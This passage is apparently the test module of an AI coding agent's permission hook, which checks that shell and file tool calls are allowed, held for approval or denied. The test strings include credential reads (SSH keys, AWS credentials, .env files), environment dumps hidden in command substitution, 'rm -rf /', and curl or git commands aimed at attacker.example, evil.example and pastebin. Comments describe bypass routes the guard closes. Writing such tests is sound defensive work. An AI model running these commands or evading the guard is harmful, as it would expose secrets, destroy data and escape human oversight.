        ] {
            // These arrive as single split subcommands (split_compound
            // handles the pipe), so test the sub the guard actually sees.
            let sub = split_compound(cmd).into_iter().next().unwrap();
            assert!(dumps_environment(&sub), "should flag env dump: {cmd:?} (sub {sub:?})");
        }
    }

    #[test]
    fn legit_env_uses_are_not_flagged() {
        for cmd in [
            "env FOO=bar my_command",      // env-as-setter
            "env FOO=bar PATH=/x program", // multiple assignments + command
            "env -i FOO=bar clean_run",    // clean env then run a command
            "export FOO=bar",              // setting a var
            "export PATH=$PATH:/opt/bin",  // setting (no sensitive expansion)
            "declare -i count=5",          // typed assignment
            "set -euo pipefail",           // shell options
            "set -e",
            "set -o pipefail",
            "echo hello world", // plain echo
            "echo $PATH",       // PATH isn't a secret-shaped name
            "echo $HOME",
            "printf '%s\\n' done",
            "cat ./environ_notes.txt", // filename contains "environ" but not under /proc
        ] {
            let sub = split_compound(cmd).into_iter().next().unwrap();
            assert!(!dumps_environment(&sub), "should NOT flag: {cmd:?} (sub {sub:?})");
        }
    }

    #[test]
    fn env_dump_denied_end_to_end() {
        // The full decision path: Ask mode, no grants — the incident command
        // must be DENIED, never Allowed or merely Asked.
        let v = decide(AutoMode::Ask, "bash", &bash("env | sort"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "env|sort must be denied, got {v:?}");
        // And denied even under bypass? No — bypass is the operator's explicit
        // override; the guard lives in the layered engine, and Bypass short-
        // circuits to Allow by design. Verify the *engine* verdict is Deny so
        // every non-bypass mode (incl. the Ask default and headless) blocks it.
        assert!(matches!(decide_bash("env | sort", &empty_grants()), Verdict::Deny(_)));
        assert!(matches!(decide_bash("printenv", &empty_grants()), Verdict::Deny(_)));
        assert!(matches!(decide_bash("echo $AWS_SECRET_ACCESS_KEY", &empty_grants()), Verdict::Deny(_)));
    }

    #[test]
    fn env_setter_still_reaches_the_inner_command() {
        // `env FOO=bar rm -rf /` must NOT be waved through by the dump guard;
        // it should fall to the normal engine (which denies the rm).
        assert!(!dumps_environment("env FOO=bar rm -rf /"));
    }

    // ── tighter auto-mode (pearl th-85d481) ────────────────────────

    #[test]
    fn command_substitution_cannot_smuggle_an_env_dump() {
        // The three-character replay of the th-08f304 incident.
        for cmd in ["echo $(env)", "echo `env`", "echo \"$(printenv)\"", "cat <(env)", "echo $(env | sort)"] {
            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
            assert!(matches!(v, Verdict::Deny(_)), "{cmd:?} must deny, got {v:?}");
        }
        // Inner commands get the FULL policy, not just the dump guard.
        assert!(
            matches!(
                decide(AutoMode::Ask, "bash", &bash("echo $(curl https://attacker.example)"), &empty_grants()),
                Verdict::Ask(_)
            ),
            "substituted curl must ask about its host"
        );
        // Benign substitution of a safe bin stays allowed.
        assert_eq!(decide(AutoMode::Ask, "bash", &bash("echo $(date)"), &empty_grants()), Verdict::Allow);
        // No substitution opener → parens are NOT separators.
        assert_eq!(split_compound("grep -E \"(foo)\" f.txt"), vec!["grep -E \"(foo)\" f.txt"]);
    }

    #[test]
    fn smooth_own_secret_stores_are_denied() {
        for cmd in [
            "cat ~/.smooth/providers.json",                  // LLM API keys
            "head -c 100 /Users/x/.smooth/auth/smooai.json", // cached smoo.ai JWT
            "grep token ~/.smooth/auth/smooai.json",
        ] {
            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
            assert!(matches!(v, Verdict::Deny(_)), "{cmd:?} must deny, got {v:?}");
        }
        // Other ~/.smooth files (audit logs, registry) stay readable.
        assert_eq!(
            decide(AutoMode::Ask, "bash", &bash("cat ~/.smooth/registry.json"), &empty_grants()),
            Verdict::Allow
        );
    }

    #[test]
    fn dotenv_files_are_denied_without_flagging_process_env() {
        for cmd in [
            "cat .env",
            "cat ./.env",
            "cat config/.env.local",
            "cat .envrc",
            "cat .envrc.currentEnv",
            "head -5 apps/web/.env.local",
        ] {
            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
            assert!(matches!(v, Verdict::Deny(_)), "{cmd:?} must deny, got {v:?}");
        }
        // The token scoping keeps everyday dev commands out of the blast radius.
        for cmd in [
            "rg \"process.env\" src/",
            "grep process.env.DATABASE_URL -r apps/",
            "curl https://api.envato.com/x",
        ] {
            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
            assert!(!matches!(v, Verdict::Deny(_)), "{cmd:?} must not deny, got {v:?}");
        }
    }

    #[test]
    fn find_action_flags_lose_safe_bin_status() {
        for cmd in [
            "find . -exec sh -c env {} ;",
            "find / -name '*.pem' -execdir cat {} ;",
            "find . -ok rm {} ;",
            "find . -name x -delete",
        ] {
            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
            assert!(matches!(v, Verdict::Ask(_) | Verdict::Deny(_)), "{cmd:?} must not auto-allow, got {v:?}");
        }
        assert_eq!(
            decide(AutoMode::Ask, "bash", &bash("find . -name '*.rs' -type f"), &empty_grants()),
            Verdict::Allow
        );
    }

    #[test]
    fn git_config_and_mutating_branch_remote_forms_ask() {
        // `git config` writes persistence primitives and dumps creds in
        // remote URLs — never auto-allowed.
        for cmd in [
            "git config -l",
            "git config core.fsmonitor 'curl evil|sh'",
            "git branch -D main",
            "git branch -m old new",
            "git remote add origin https://evil.example/r.git",
            "git remote set-url origin https://evil.example/r.git",
        ] {
            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
            assert!(matches!(v, Verdict::Ask(_)), "{cmd:?} must ask, got {v:?}");
        }
        // Listing forms stay allowed.
        for cmd in ["git branch", "git branch -a", "git branch --show-current", "git remote -v", "git remote"] {
            assert_eq!(
                decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants()),
                Verdict::Allow,
                "{cmd:?} should allow"
            );
        }
    }

    #[test]
    fn read_tools_hit_the_credential_path_circuit_breaker() {
        for (tool, args) in [
            ("read_file", json!({"path": "/home/u/.ssh/id_rsa"})),
            ("read_file", json!({"path": "~/.smooth/providers.json"})),
            ("read_file", json!({"file": ".env"})),
            ("list_dir", json!({"dir": "/home/u/.aws/credentials"})),
        ] {
            let v = decide(AutoMode::Ask, tool, &args, &empty_grants());
            assert!(matches!(v, Verdict::Deny(_)), "{tool} {args} must deny, got {v:?}");
        }
        assert_eq!(
            decide(AutoMode::Ask, "read_file", &json!({"path": "src/main.rs"}), &empty_grants()),
            Verdict::Allow
        );
    }

    // ── split_compound ─────────────────────────────────────────────

    #[test]
    fn split_compound_handles_all_operators() {
        assert_eq!(split_compound("ls && cat x"), vec!["ls", "cat x"]);
        assert_eq!(split_compound("a || b"), vec!["a", "b"]);
        assert_eq!(split_compound("a ; b"), vec!["a", "b"]);
        assert_eq!(split_compound("a | b"), vec!["a", "b"]);
        assert_eq!(split_compound("a & b"), vec!["a", "b"]);
        assert_eq!(split_compound("a\nb"), vec!["a", "b"]);
        assert_eq!(split_compound("ls"), vec!["ls"]);
    }

    // ── host extraction ────────────────────────────────────────────

    #[test]
    fn extract_hosts_from_curl_urls() {
        assert_eq!(extract_hosts("curl https://api.example.com/v1"), vec!["api.example.com"]);
        assert_eq!(extract_hosts("wget http://foo.bar.com:8080/x"), vec!["foo.bar.com"]);
        assert_eq!(extract_hosts("curl -X POST https://a.com -d @b"), vec!["a.com"]);
        assert!(extract_hosts("ls -la").is_empty());
        assert!(extract_hosts("echo https://not-a-fetch.com").is_empty()); // echo isn't a net tool
    }

    #[test]
    fn extract_hosts_strips_userinfo_and_ports() {
        assert_eq!(extract_hosts("curl https://user:pw@evil.com:9000/path"), vec!["evil.com"]);
    }

    #[test]
    fn extract_hosts_ignores_flag_values() {
        // `-X POST` — POST is not a host; only the URL is picked up.
        let hosts = extract_hosts("curl -X POST -H accept:json https://api.ok.com");
        assert_eq!(hosts, vec!["api.ok.com"]);
    }

    // ── the pearl's headline security cases ────────────────────────

    #[test]
    fn rm_rf_root_is_denied_without_ask() {
        let v = decide(AutoMode::Ask, "bash", &bash("rm -rf /"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn rm_rf_root_hidden_in_compound_still_denied() {
        // The classic bypass: ride in on a safe first command.
        let v = decide(AutoMode::Ask, "bash", &bash("ls && rm -rf /"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "compound rm -rf must deny; got {v:?}");
    }

    #[test]
    fn safe_command_riding_before_curl_still_asks() {
        // `ls` is safe but the whole line must not auto-allow because of it.
        let v = decide(AutoMode::Ask, "bash", &bash("ls && curl https://attacker.example"), &empty_grants());
        match v {
            Verdict::Ask(a) => assert_eq!(a.grant_entry, "attacker.example"),
            other => panic!("expected Ask about the curl host, got {other:?}"),
        }
    }

    #[test]
    fn curl_attacker_site_asks_by_default() {
        let v = decide(AutoMode::Ask, "bash", &bash("curl https://attacker.example/x"), &empty_grants());
        assert!(matches!(v, Verdict::Ask(_)), "got {v:?}");
    }

    #[test]
    fn curl_attacker_site_denied_when_headless() {
        let v = decide(AutoMode::DenyUnmatched, "bash", &bash("curl https://attacker.example/x"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "headless must fail closed; got {v:?}");
    }

    #[test]
    fn curl_allowed_after_host_grant() {
        let mut grants = WonkGrants::new();
        grants.add_host("api.trusted.com");
        let v = decide(AutoMode::Ask, "bash", &bash("curl https://api.trusted.com/v1"), &grants);
        assert_eq!(v, Verdict::Allow);
    }

    #[test]
    fn skill_allowed_hosts_pre_grant_allows_without_prompt() {
        // A skill's `allowed_hosts` become session grants — same path as a
        // user grant. Pre-seed and confirm no Ask.
        let mut grants = WonkGrants::new();
        grants.add_host("smoo-hub"); // exact host, no dot — but grant is exact-match
        grants.add_host("smoo-hub.local");
        let v = decide(AutoMode::Ask, "bash", &bash("curl http://smoo-hub.local:8787/api"), &grants);
        assert_eq!(v, Verdict::Allow);
    }

    #[test]
    fn dangerous_domain_denied_even_via_curl() {
        let v = decide(AutoMode::Ask, "bash", &bash("curl https://pastebin.com/raw/x"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "dangerous domain must deny; got {v:?}");
    }

    #[test]
    fn dangerous_domain_denied_even_in_bypass_mode() {
        let v = decide(AutoMode::Bypass, "bash", &bash("curl https://pastebin.com/raw/x"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "bypass must keep the domain circuit-breaker; got {v:?}");
    }

    // ── credential-path guard ──────────────────────────────────────

    #[test]
    fn reading_ssh_key_is_denied() {
        let v = decide(AutoMode::Ask, "bash", &bash("cat ~/.ssh/id_rsa"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn reading_aws_credentials_denied_even_in_bypass() {
        let v = decide(AutoMode::Bypass, "bash", &bash("cat ~/.aws/credentials"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "got {v:?}");
    }

    #[test]
    fn sensitive_path_deny_beats_safe_bin() {
        // `cat` is a safe bin, but the target is a credential file.
        let v = decide(AutoMode::Ask, "bash", &bash("cat .ssh/id_ed25519"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "got {v:?}");
    }

    // ── safe read-only defaults ────────────────────────────────────

    #[test]
    fn safe_readonly_bins_allowed() {
        for cmd in ["ls -la", "cat README.md", "grep foo bar.txt", "find . -name x", "pwd", "echo hi"] {
            assert_eq!(decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants()), Verdict::Allow, "{cmd} should allow");
        }
    }

    #[test]
    fn git_read_subcommands_allowed_writes_ask() {
        assert_eq!(decide(AutoMode::Ask, "bash", &bash("git status"), &empty_grants()), Verdict::Allow);
        assert_eq!(decide(AutoMode::Ask, "bash", &bash("git log --oneline"), &empty_grants()), Verdict::Allow);
        assert!(matches!(
            decide(AutoMode::Ask, "bash", &bash("git push origin main"), &empty_grants()),
            Verdict::Ask(_)
        ));
        assert!(matches!(
            decide(AutoMode::Ask, "bash", &bash("git reset --hard"), &empty_grants()),
            Verdict::Ask(_)
        ));
    }

    #[test]
    fn unknown_mutating_command_asks_with_bin_prefix() {
        match decide(AutoMode::Ask, "bash", &bash("npm install left-pad"), &empty_grants()) {
            Verdict::Ask(a) => {
                assert_eq!(a.grant_kind, "cli");
                assert_eq!(a.grant_entry, "npm ");
            }
            other => panic!("expected Ask, got {other:?}"),
        }
    }

    #[test]
    fn granted_bash_prefix_allows() {
        let mut grants = WonkGrants::new();
        grants.add_bash_pattern("npm ");
        assert_eq!(decide(AutoMode::Ask, "bash", &bash("npm install left-pad"), &grants), Verdict::Allow);
    }

    #[test]
    fn wrapper_stripped_before_evaluation() {
        // `timeout 5 rm -rf /` must still be denied — the wrapper doesn't hide it.
        let v = decide(AutoMode::Ask, "bash", &bash("timeout 5 rm -rf /"), &empty_grants());
        assert!(matches!(v, Verdict::Deny(_)), "got {v:?}");
        // `timeout 5 ls` is safe.
        assert_eq!(decide(AutoMode::Ask, "bash", &bash("timeout 5 ls"), &empty_grants()), Verdict::Allow);
    }

    // ── non-bash categories ────────────────────────────────────────

    #[test]
    fn internal_tools_are_safe() {
        for t in ["pearls_list", "pearls_search", "teammate_spawn", "web_search"] {
            assert_eq!(decide(AutoMode::Ask, t, &json!({}), &empty_grants()), Verdict::Allow, "{t}");
        }
    }

    #[test]
    fn write_tool_asks_and_sensitive_path_denies() {
        assert!(matches!(
            decide(AutoMode::Ask, "file_write", &json!({"path": "/tmp/x"}), &empty_grants()),
            Verdict::Ask(_)
        ));
        assert!(matches!(
            decide(AutoMode::Ask, "file_write", &json!({"path": "/home/u/.ssh/authorized_keys"}), &empty_grants()),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn unknown_tool_asks_fail_closed_when_headless() {
        assert!(matches!(decide(AutoMode::Ask, "mystery_tool", &json!({}), &empty_grants()), Verdict::Ask(_)));
        assert!(matches!(
            decide(AutoMode::DenyUnmatched, "mystery_tool", &json!({}), &empty_grants()),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn network_tool_extracts_host() {
        assert!(matches!(
            decide(AutoMode::Ask, "web_fetch", &json!({"url": "https://new.example.com/x"}), &empty_grants()),
            Verdict::Ask(_)
        ));
        let mut grants = WonkGrants::new();
        grants.add_host("new.example.com");
        assert_eq!(
            decide(AutoMode::Ask, "web_fetch", &json!({"url": "https://new.example.com/x"}), &grants),
            Verdict::Allow
        );
    }

    #[test]
    fn bypass_allows_ordinary_ask_but_not_denies() {
        // Ordinary mutating command: bypass allows.
        assert_eq!(decide(AutoMode::Bypass, "bash", &bash("npm install x"), &empty_grants()), Verdict::Allow);
        // Empty bash: still a deny (malformed).
        assert!(matches!(decide(AutoMode::Bypass, "bash", &bash(""), &empty_grants()), Verdict::Deny(_)));
    }

    #[test]
    fn mode_from_env_value() {
        assert_eq!(AutoMode::from_env_value(None), AutoMode::Ask);
        assert_eq!(AutoMode::from_env_value(Some("bypass")), AutoMode::Bypass);
        assert_eq!(AutoMode::from_env_value(Some("DENY")), AutoMode::DenyUnmatched);
        assert_eq!(AutoMode::from_env_value(Some("garbage")), AutoMode::Ask);
        // acceptEdits accepts the dash / underscore / camel spellings.
        assert_eq!(AutoMode::from_env_value(Some("accept-edits")), AutoMode::AcceptEdits);
        assert_eq!(AutoMode::from_env_value(Some("accept_edits")), AutoMode::AcceptEdits);
        assert_eq!(AutoMode::from_env_value(Some("acceptEdits")), AutoMode::AcceptEdits);
        assert_eq!(AutoMode::from_env_value(Some("edits")), AutoMode::AcceptEdits);
        // dash/underscore normalization also covers deny_unmatched.
        assert_eq!(AutoMode::from_env_value(Some("deny-unmatched")), AutoMode::DenyUnmatched);
    }

    // ── acceptEdits mode ───────────────────────────────────────────

    #[test]
    fn accept_edits_auto_approves_write_tools() {
        // A write tool that would Ask under the default engine is allowed.
        assert_eq!(
            decide(AutoMode::AcceptEdits, "file_write", &json!({"path": "/tmp/x"}), &empty_grants()),
            Verdict::Allow
        );
        assert_eq!(
            decide(AutoMode::AcceptEdits, "apply_patch", &json!({"path": "src/lib.rs"}), &empty_grants()),
            Verdict::Allow
        );
    }

    #[test]
    fn accept_edits_still_denies_sensitive_path_writes() {
        // The credential-path circuit-breaker survives acceptEdits.
        assert!(matches!(
            decide(
                AutoMode::AcceptEdits,
                "file_write",
                &json!({"path": "/home/u/.ssh/authorized_keys"}),
                &empty_grants()
            ),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn accept_edits_still_asks_for_bash_and_network() {
        // Only the Write category is auto-approved — bash + network still ask.
        assert!(matches!(
            decide(AutoMode::AcceptEdits, "bash", &bash("npm install x"), &empty_grants()),
            Verdict::Ask(_)
        ));
        assert!(matches!(
            decide(
                AutoMode::AcceptEdits,
                "web_fetch",
                &json!({"url": "https://new.example.com/x"}),
                &empty_grants()
            ),
            Verdict::Ask(_)
        ));
        // …and still denies the hard cases.
        assert!(matches!(
            decide(AutoMode::AcceptEdits, "bash", &bash("rm -rf /"), &empty_grants()),
            Verdict::Deny(_)
        ));
    }

    // ── the async hook ─────────────────────────────────────────────

    fn call(name: &str, args: serde_json::Value) -> ToolCall {
        ToolCall {
            id: "c1".into(),
            name: name.into(),
            arguments: args,
        }
    }

    #[tokio::test]
    async fn hook_allows_safe_command() {
        let hook = AutoModeHook::new(AutoMode::Ask, AccessStore::new(), SharedWonkGrants::default(), PathBuf::from("/tmp"));
        assert!(hook.pre_call(&call("bash", bash("ls -la"))).await.is_ok());
        assert_eq!(hook.audit(), vec![("bash".into(), "allow".into())]);
    }

    #[tokio::test]
    async fn hook_denies_dangerous_command() {
        let hook = AutoModeHook::new(AutoMode::Ask, AccessStore::new(), SharedWonkGrants::default(), PathBuf::from("/tmp"));
        assert!(hook.pre_call(&call("bash", bash("rm -rf /"))).await.is_err());
        assert_eq!(hook.audit(), vec![("bash".into(), "deny".into())]);
    }

    #[tokio::test]
    async fn hook_ask_times_out_fail_closed() {
        let hook = AutoModeHook::new(AutoMode::Ask, AccessStore::new(), SharedWonkGrants::default(), PathBuf::from("/tmp"))
            .with_ask_timeout(Duration::from_millis(20));
        // No one is listening → the ask times out → fail closed.
        let res = hook.pre_call(&call("bash", bash("npm install x"))).await;
        assert!(res.is_err(), "unattended ask must fail closed");
        assert_eq!(hook.audit(), vec![("bash".into(), "ask:timeout".into())]);
        assert_eq!(hook.access.pending_count(), 0, "timed-out request must be expired");
    }

    #[tokio::test]
    async fn hook_ask_approved_allows_and_persists_session_grant() {
        let access = AccessStore::new();
        let grants = SharedWonkGrants::default();
        let hook = AutoModeHook::new(AutoMode::Ask, access.clone(), grants.clone(), PathBuf::from("/tmp")).with_ask_timeout(Duration::from_secs(5));

        // Drive an approval concurrently: wait for the pending request,
        // then resolve it at Session scope.
        let access2 = access.clone();
        let approver = tokio::spawn(async move {
            for _ in 0..100 {
                let pending = access2.list_pending();
                if let Some(p) = pending.first() {
                    access2.resolve(&p.id, ResolutionVerdict::Approve, Scope::Session, None).unwrap();
                    return;
                }
                tokio::time::sleep(Duration::from_millis(5)).await;
            }
            panic!("no pending request appeared");
        });

        let res = hook.pre_call(&call("bash", bash("npm install x"))).await;
        approver.await.unwrap();
        assert!(res.is_ok(), "approved ask should allow");

        // The session grant is now live — the same command allows without asking.
        assert_eq!(decide(AutoMode::Ask, "bash", &bash("npm install left-pad"), &grants.snapshot()), Verdict::Allow);
    }

    #[tokio::test]
    async fn hook_ask_denied_blocks() {
        let access = AccessStore::new();
        let hook =
            AutoModeHook::new(AutoMode::Ask, access.clone(), SharedWonkGrants::default(), PathBuf::from("/tmp")).with_ask_timeout(Duration::from_secs(5));
        let access2 = access.clone();
        let denier = tokio::spawn(async move {
            for _ in 0..100 {
                if let Some(p) = access2.list_pending().first() {
                    access2.resolve(&p.id, ResolutionVerdict::Deny, Scope::Once, None).unwrap();
                    return;
                }
                tokio::time::sleep(Duration::from_millis(5)).await;
            }
            panic!("no pending request");
        });
        let res = hook.pre_call(&call("bash", bash("npm install x"))).await;
        denier.await.unwrap();
        assert!(res.is_err(), "denied ask must block");
    }

    #[tokio::test]
    async fn hook_persists_user_grant_to_toml() {
        let tmp = tempfile::TempDir::new().unwrap();
        // Point the project grants at a temp workspace.
        let access = AccessStore::new();
        let grants = SharedWonkGrants::default();
        let hook = AutoModeHook::new(AutoMode::Ask, access.clone(), grants.clone(), tmp.path().to_path_buf()).with_ask_timeout(Duration::from_secs(5));

        let access2 = access.clone();
        let approver = tokio::spawn(async move {
            for _ in 0..100 {
                if let Some(p) = access2.list_pending().first() {
                    access2.resolve(&p.id, ResolutionVerdict::Approve, Scope::PearlProject, None).unwrap();
                    return;
                }
                tokio::time::sleep(Duration::from_millis(5)).await;
            }
            panic!("no pending request");
        });
        hook.pre_call(&call("bash", bash("npm install x"))).await.unwrap();
        approver.await.unwrap();

        // The project wonk-allow.toml now carries the `npm ` prefix grant.
        let path = project_grants_path(tmp.path());
        let persisted = WonkGrants::load_from_path(&path).unwrap();
        assert!(persisted.matches_bash("npm install anything"));
    }
}
